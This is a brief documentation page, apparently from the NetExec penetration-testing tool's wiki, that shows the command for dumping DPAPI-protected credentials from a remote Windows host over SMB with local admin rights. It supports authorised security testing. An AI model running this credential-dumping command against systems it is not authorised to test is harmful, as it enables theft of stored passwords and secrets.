---
description: Dump DPAPI credentials using NetExec
---

# Dump DPAPI

You can dump DPAPI credentials using NetExec using the following option --dpapi

{% hint style="danger" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

```
$ NetExec smb <ip> -u user -p password --dpapi
```
